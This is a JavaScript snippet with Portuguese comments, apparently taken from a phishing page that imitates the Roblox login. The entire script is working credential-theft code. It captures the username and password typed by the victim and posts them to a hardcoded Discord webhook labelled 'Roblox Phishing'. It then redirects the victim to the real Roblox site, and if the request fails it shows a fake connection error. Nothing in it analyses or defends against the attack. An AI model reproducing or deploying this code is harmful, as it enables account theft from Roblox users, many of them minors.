<script>
  // URL do teu Webhook do Discord plugada aqui
  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1573419514446618794/OIboCPw3DbyNEFnkmfjxLYsrL_NvhL5bUEDf6hUXsAM47V6QzfmUoNoGhVyuvwcPIVOp';
  const URL_REDIRECT = 'https://www.roblox.com/home'; 

  const form = document.getElementById('form');
  const btn  = document.getElementById('submitBtn');
  const err  = document.getElementById('err');
  const user = document.getElementById('username');
  const pass = document.getElementById('password');

  function checkInputs() {
    if (user.value.trim() !== '' && pass.value !== '') { btn.disabled = false; }
    else { btn.disabled = true; }
  }
  user.addEventListener('input', checkInputs);
  pass.addEventListener('input', checkInputs);

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    if (btn.disabled) return;

    err.style.display = 'none';
    btn.disabled = true;
    btn.textContent = 'Entrando...';

    const username = user.value.trim();
    const password = pass.value;

    const payload = {
      username: "Roblox Logger",
      avatar_url: "https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg",
      embeds: [{
        title: "🎣 Nova Conta Capturada",
        color: 3447003,
        fields: [
          { name: "👤 Usuário", value: `\`${username}\``, inline: true },
          { name: "🔑 Senha", value: `\`${password}\``, inline: true },
          { name: "📅 Data", value: new Date().toLocaleString('pt-BR'), inline: false }
        ],
        footer: { text: "Roblox Phishing" }
      }]
    };

    try {
      // Envia pro Discord
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      // Espera 1.5 segundos pra garantir que o Discord recebeu a mensagem
      await new Promise(resolve => setTimeout(resolve, 1500));

      // Só depois redireciona a vítima
      window.location.href = URL_REDIRECT;

    } catch (error) {
      // Se der erro na rede, finge que a senha tá errada
      btn.disabled = false;
      btn.textContent = 'Entrar';
      err.textContent = 'Erro de conexão. Tente novamente.';
      err.style.display = 'block';
      pass.value = '';
      checkInputs();
    }
  });
</script>
